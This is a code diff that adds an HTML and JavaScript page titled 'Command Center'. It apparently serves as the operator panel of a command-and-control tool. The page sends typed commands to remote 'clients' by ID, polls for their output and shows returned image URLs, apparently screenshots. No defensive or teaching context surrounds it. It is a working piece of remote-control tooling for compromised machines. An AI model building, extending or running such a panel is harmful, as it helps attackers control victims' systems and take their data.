@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Center</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            margin: 20px;
+            background: linear-gradient(270deg, #000, #0a0c0b);
+            background-size: 400% 400%;
+            color: #31a50e;
+        }
+
+        #commandInput,
+        button {
+            font-family: Arial, sans-serif;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #00d400;
+            color: rgb(0, 0, 0);
+            font-weight: bold;
+            margin-top: auto;
+        }
+
+        h2, h3 {
+            color: #05ee24;
+        }
+
+        #results {
+            flex: 3;
+            width: 100%;
+            box-sizing: border-box;
+            white-space: pre-wrap;
+            overflow-y: auto;
+            background-color: #000;
+            color: #70d437;
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #56d331;
+            border-radius: 5px;
+            font-family: 'Courier New', Courier, monospace;
+            height: 400px;
+        }
+
+        nav {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        nav a {
+            color: rgb(21, 255, 0);
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: bold;
+        }
+
+        nav a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <a href="/">Home</a>
+        <a href="/uploads">Uploads</a>
+        <a href="/interact">C2</a>
+        <a href="/clients">Clients</a>
+        <a href="/Theshow">TheShow</a>
+    </nav>
+    <h2>Command Center</h2>
+
+    <form id="interactionForm">
+        <div id="resultsContainer">
+            <h2>Results:</h2>
+            <div id="results"><img id="resultImage" style="max-width: 50%;" src="" /></div>
+            
+            <label for="command">Command:</label>
+            <input type="text" id="command" name="command" required>  
+            <button type="button" onclick="sendCommand()">Send Command</button>
+        </div>
+    </form>
+    
+
+    <script>
+        function getQueryParam(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        var clientID = getQueryParam("clientID");
+        console.log("Selected Client ID:", clientID);
+
+        var lastExecutionTime = 0; // Initialize the timestamp
+
+        async function sendCommand() {
+            var command = document.getElementById("command").value;
+
+            try {
+                // Check if the command is not empty
+                if (command.trim() !== "") {
+                    const response = await fetch(`/commands/${clientID}`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json;charset=UTF-8",
+                        },
+                        body: JSON.stringify({ "command": command }),
+                    });
+
+                    if (response.ok) {
+                        console.log("Command sent successfully");
+                        document.getElementById("interactionForm").reset(); // Clear the form
+
+                        // Start checking for results after sending a command
+                        await checkResults(); // Await the completion of checkResults
+
+                        // Additional logic to check if the last result is an image URL
+                        const lastResultContainer = document.getElementById(`results-${clientID}`);
+                        const lastResultText = lastResultContainer.innerText.trim();
+                        
+                        if (isImageUrl(lastResultText)) {
+                            // Set the src attribute of the img element
+                            document.getElementById('resultImage').src = lastResultText;
+                        } else {
+                            // Clear the img element if it's not an image URL
+                            document.getElementById('resultImage').src = "";
+                        }
+                    } else {
+                        console.error("Error sending command:", response.statusText);
+                    }
+                } else {
+                    // Display the last result without making a new request
+                    await checkResults();
+                }
+            } catch (error) {
+                console.error("Error sending command:", error);
+            }
+        }
+
+        async function checkResults() {
+            try {
+                var retryCount = 0;
+                var maxRetries = 10;
+
+                while (retryCount < maxRetries) {
+                    const response = await fetch(`/results/${clientID}?timestamp=${lastExecutionTime}`);
+                    const contentType = response.headers.get('content-type');
+                    const resultsText = await response.text();
+
+                    var resultsContainer = document.getElementById("results");
+
+                    if (!document.getElementById(`results-${clientID}`)) {
+                        var clientResultsContainer = document.createElement("div");
+                        clientResultsContainer.id = `results-${clientID}`;
+                        resultsContainer.appendChild(clientResultsContainer);
+                    }
+
+                    var clientContainer = document.getElementById(`results-${clientID}`);
+
+                    if (contentType && contentType.includes('application/json')) {
+                        const resultsArray = JSON.parse(resultsText);
+                        const formattedResults = resultsArray.map(result => result.output).join('\n');
+                        clientContainer.innerHTML = "<pre>" + formattedResults + "</pre>";
+                        
+                        
+                        if (isImageUrl(formattedResults)) {
+                            // Set the src attribute of the img element
+                            document.getElementById('resultImage').src = formattedResults;
+                        } else {
+                            // Clear the img element if it's not an image URL
+                            document.getElementById('resultImage').src = "";
+                        }
+                    
+                    } else {
+                        clientContainer.innerHTML = "<pre>" + resultsText + "</pre>";
+                    }
+
+                    const timestampMatch = response.headers.get('X-Command-Timestamp');
+                    lastExecutionTime = timestampMatch ? parseInt(timestampMatch) : lastExecutionTime;
+
+                    if (resultsText.trim() !== "") {
+                        break;
+                    }
+                    retryCount++;
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+
+                if (retryCount === maxRetries) {
+                    console.log("Maximum retries reached. No results received.");
+                }
+            } catch (error) {
+                console.error("Error checking results:", error);
+            }
+        }
+
+        function isImageUrl(url) {
+            // You can enhance this function based on the characteristics of your image URLs
+            return url.startsWith("http");
+        }
+    </script>
+</body>
+</html>
